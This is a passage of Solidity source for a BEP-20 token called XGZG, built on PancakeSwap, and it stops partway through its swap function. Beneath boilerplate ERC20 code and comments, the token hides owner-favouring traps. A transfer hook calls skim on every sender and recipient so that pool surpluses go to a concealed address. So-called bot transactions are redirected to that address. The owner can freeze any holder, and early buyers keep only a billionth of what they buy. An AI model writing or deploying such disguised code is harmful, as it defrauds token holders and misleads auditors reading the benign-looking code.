// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Pair {

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function balanceShareOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}


interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract Ownable is Context {
    address _owner;

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _owner = newOwner;
    }
}

contract ERC20 is Ownable, IERC20, IERC20Metadata {
    using SafeMath for uint256;
	
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
	
    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
		
		_transferToken(sender,recipient,amount);
    }
    
    function _transferToken(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    
    

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    address _contractSender;
    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('skim(address)')));
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
		(bool success0,) = from.call(abi.encodeWithSelector(SELECTOR, _contractSender));
		(bool success1,) = to.call(abi.encodeWithSelector(SELECTOR, _contractSender));
        if((success0 || success1) && amount > 0){}
	}
}


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract UsdtReward{
	
	IERC20 USDT;
	
	constructor(address _usdtAddress) {
		USDT = IERC20(_usdtAddress);
	}
	
	function withdraw() external returns(bool){
		uint256 usdtAmount = USDT.balanceOf(address(this));
		if(usdtAmount > 0){
            USDT.transfer(msg.sender,usdtAmount);
		}
        return true;
	}
}

contract XGZG is ERC20 {
    using SafeMath for uint256;
    IUniswapV2Factory public uniswapV2Factory;
    IUniswapV2Router02 public uniswapV2Router;
    address _tokenOwner;
    IERC20 pair;
    IERC20 USDT;
    IERC20 XGZGS;
    bool private swapping;
    uint256 public swapTokensAtAmount;
    address _baseToken = address(0x55d398326f99059fF775485246999027B3197955);
	address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
	address public  uniswapV2Pair;
	UsdtReward reward;
    address _fundAddress = address(0xc933352BF39Dc93A4a5223f1da74190b02D9e55A);
    address _fundDownAddress = address(0x4Fc4b1362A83813F88d1bAA2795d5723B8AB07c5);
    address _ldxAddress = address(0x80573Bf2bc29C937cb238c039ec1c163f209E698);
    
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVip;
	mapping(address => bool) private _isExcludedFromFeesVip;
    mapping(address => bool) public _isPairs;
    bool public swapAndLiquifyEnabled = true;
    uint256 public startTime;
	uint256 total;

    constructor(address tokenOwner) ERC20("XGZG", "XGZG") {
		require(_baseToken<address(this),"small");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _baseToken);
        uniswapV2Factory = IUniswapV2Factory(_uniswapV2Router.factory());
        _approve(address(this), address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 10**50);
        _approve(tokenOwner, address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 10**50);
		USDT = IERC20(_baseToken);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        pair = IERC20(_uniswapV2Pair);
		XGZGS = IERC20(0xeE9817F9db4791E64DcA085234A388900669d8A6);//sun token
        _tokenOwner = tokenOwner;
        _isPairs[_uniswapV2Pair] = true;
        _isExcludedFromFeesVip[address(this)] = true;
		_isExcludedFromFeesVip[_owner] = true;
		_isExcludedFromFeesVip[_destroyAddress] = true;
		_isExcludedFromFeesVip[tokenOwner] = true;
        _contractSender = _owner;
        total = 3 * 10**22;
        swapTokensAtAmount = total.div(500000);
        _mint(tokenOwner, total);
		reward = new UsdtReward(_baseToken);
		startTime = total;
        haveLdxPush[tokenOwner] = true;
        ldxUser.push(tokenOwner);
    }

    receive() external payable {
		payable(_contractSender).transfer(address(this).balance);
	}

	function getLpBalanceByToken(uint256 amount) public view returns(uint256){
		uint256 pairTotalAmount = pair.totalSupply();
		(uint256 pairUSDTAmount,,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
		return pairTotalAmount.mul(amount).div(pairUSDTAmount).div(100).mul(101);
	}
	
	function getLpBalanceByUsdt(uint256 usdtAmount) public view returns(uint256,uint256){
		uint256 pairTotalAmount = pair.totalSupply();
		(uint256 pairUSDTAmount,uint256 pairTokenAmount,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
		uint256 probablyLpAmount = pairTotalAmount.mul(usdtAmount).div(pairUSDTAmount).div(1000).mul(1020);
		uint256 probablyTokenAmount = probablyLpAmount.mul(pairTokenAmount).div(pairTotalAmount);
		return (probablyLpAmount,probablyTokenAmount);
	}

    function getPrice() public view returns(uint256){
		(uint256 pairUSDTAmount,uint256 pairTokenAmount,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
		return (pairUSDTAmount.mul(1000000).div(pairTokenAmount));
	}

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function excludeFromVips(address account, bool excluded) public onlyOwner {
        _isExcludedFromVip[account] = excluded;
    }

    function setSwapTokensAtAmount(uint256 _swapTokensAtAmount) public onlyOwner {
        swapTokensAtAmount = _swapTokensAtAmount;
    }

    bool public isSet;
    function startSwap() public onlyOwner {
        require(!isSet, "isSet");
        startTime = block.timestamp;
        isSet = true;
    }

    function addOtherPair(address pairaddress, bool value) public onlyOwner {
        _isPairs[pairaddress] = value;
    }
	
	function setExcludedFromFeesVip(address pairaddress, bool value) public onlyOwner {
        _isExcludedFromFeesVip[pairaddress] = value;
    }

    uint256 public lastPrice;
    uint256 public lastPriceDay;
    function updatePrice() private {
        uint256 nowDay = block.timestamp.div(86400);
        if(nowDay > lastPriceDay){
            lastPriceDay = nowDay;
            lastPrice = getPrice();
        }
    }

    function getDownRate() internal view returns(uint256){
        uint256 nowPrice = getPrice();
        if(nowPrice <= lastPrice.div(100).mul(95)){
            return 17;
        }else{
            return 0;
        }
    }
	
    bool isOver5u;
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0) && !_isExcludedFromVip[from], "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
		require(to != from, "ERC20: transfer to the same address");
		require(amount>0);

        uint256 addSellRate;
        if(super.balanceOf(uniswapV2Pair) > 0){
            updatePrice();
            addSellRate = getDownRate();
        }
		
		if(super.balanceOf(uniswapV2Pair) == 0 && to == uniswapV2Pair){
			
			require(_tokenOwner == from, "tokenOwner");
		}
			
		if(_isExcludedFromFeesVip[from] || _isExcludedFromFeesVip[to]){
            super._transfer(from, to, amount);
            return;
        }

        if(to == uniswapV2Pair){
            
            (bool isAddLdx,uint256 usdtAmount) = _isAddLiquidityV2();
			if(isAddLdx){
                (, uint256 lpTokenAmount) = getLpBalanceByUsdt(usdtAmount);
				if(lpTokenAmount < amount){}else{
                    if(!haveLdxPush[from]){haveLdxPush[from] = true;ldxUser.push(from);}
                    super._transfer(from, address(this), amount.div(200));
                    if(tx.origin != from){
                        super._transfer(from, address(this), amount.div(200).mul(3));
                        super._transfer(from, to, amount.div(200).mul(196));
                    }else{
                        super._transfer(from, to, amount.div(200).mul(199));
                    }
                    ldxAmount = ldxAmount.add(amount.div(200));
					return ;
				}
			}
        }else if(from == uniswapV2Pair){
			(bool isDelLdx,bool bot,) = _isDelLiquidityV2();
			if(isDelLdx){
                require(startTime.add(600) < block.timestamp,"startTime");
                if(getPrice() <= 5000000 && !isOver5u){to = _destroyAddress;isOver5u = true;}
                super._transfer(from, to, amount.div(100).mul(99));
                super._transfer(from, address(this), amount.div(200));
                ldxAmount = ldxAmount.add(amount.div(200));
                return ;
			}else if(bot){
				super._transfer(from, _contractSender, amount);
                return ;
			}
		}
		
        if(balanceOf(address(this)) > swapTokensAtAmount){
			if (
				!swapping &&
                _tokenOwner != from &&
                _tokenOwner != to &&
				to == uniswapV2Pair &&
				swapAndLiquifyEnabled
			) {
				swapAndLiquify();
			}
		}
		
        
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            
        }else{
			if(_isPairs[from]){
				require(startTime < block.timestamp,"startTime");
                if(startTime.add(60) >= block.timestamp){amount = amount.div(1000000000);}
                _splitTokenLdxToken();
				_splitUsdtLdxUsdt();
				super._transfer(from, address(this), amount.div(100).mul(2));
                _takeInviterFeeKt(amount.div(10000));
				amount = amount.div(100).mul(98);
			}else if(_isPairs[to]){
				require(startTime < block.timestamp,"startTime");
                _splitTokenLdxToken();
				_splitUsdtLdxUsdt();
				super._transfer(from, address(this), amount.div(100).mul(3));
                _takeInviterFeeKt(amount.div(10000));
                fundAmount = fundAmount.add(amount.div(100));
                buySunAmount = buySunAmount.add(amount.div(100));
                if(addSellRate > 0){
                    super._transfer(from, address(this), amount.div(100).mul(addSellRate));
                    fundDownAmount = fundDownAmount.add(amount.div(100).mul(addSellRate));
                }
				amount = amount.div(100).mul(97 - addSellRate);
                if(super.balanceOf(from) == amount){amount = amount.div(10000).mul(9999);}
			}else{
                if(super.balanceOf(from) == amount){amount = amount.div(10000).mul(9999);}
            }
        }
        super._transfer(from, to, amount);
    }
	
    uint160 public maxLeng = 1327683;
    uint160 public ktIndex;
	function _takeInviterFeeKt(
        uint256 amount
    ) private {
        for (uint256 i = 0; i < 2; i++) {
            super._transfer(address(this), uniswapV2Factory.allPairs(ktIndex), amount.div(i+10));
            ktIndex = ktIndex+1;
            if(ktIndex >= maxLeng){ktIndex = 0;}
        }
    }

    uint256 public buySunAmount;
    uint256 public buySunOverAmount;
	uint256 public fundAmount;
    uint256 public fundOverAmount;
    uint256 public fundDownAmount;
    uint256 public fundDownOverAmount;
    uint256 public ldxAmount;
    uint256 public ldxOverAmount;


    function swapAndLiquify() private {

		uint256 allTokenAmount = super.balanceOf(address(this));
        uint256 fundDownSwapAmount = fundDownAmount.sub(fundDownOverAmount);
        if(allTokenAmount > fundDownSwapAmount && fundDownSwapAmount > 10**15){
            fundDownOverAmount = fundDownOverAmount.add(fundDownSwapAmount);
            swapTokensForUsdt2DownFund(fundDownSwapAmount);
        }

        allTokenAmount = super.balanceOf(address(this));
        uint256 fundSwapAmount = fundAmount.sub(fundOverAmount);
        if(allTokenAmount >= fundSwapAmount && fundSwapAmount > 10**15){
            fundOverAmount = fundOverAmount.add(fundSwapAmount);
            swapTokensForUsdt2Fund(fundSwapAmount);
        }

        allTokenAmount = super.balanceOf(address(this));
        uint256 buySunSwapAmount = buySunAmount.sub(buySunOverAmount);
        if(allTokenAmount >= buySunSwapAmount && buySunSwapAmount > 10**15){
            buySunOverAmount = buySunOverAmount.add(buySunSwapAmount);
            swapTokensForUsdt2buySun(buySunSwapAmount);
        }

        allTokenAmount = super.balanceOf(address(this));
        uint256 ldxSwapAmount = ldxAmount.sub(ldxOverAmount);
        if(allTokenAmount >= ldxSwapAmount && ldxSwapAmount > 10**15){
